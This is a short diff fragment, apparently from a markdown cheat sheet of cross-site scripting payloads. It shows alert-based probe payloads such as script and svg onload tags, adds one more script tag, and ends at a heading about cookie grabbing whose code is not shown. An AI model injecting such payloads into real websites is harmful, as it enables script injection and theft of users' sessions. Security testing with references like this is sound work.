@@ -2,6 +2,7 @@
 ```js
 <script>alert(1)</script>
 <svg/ onload=alert(123)//
+<script onclick="alert(1)">
 ```
 #### For cookie grabbing.
 ```js
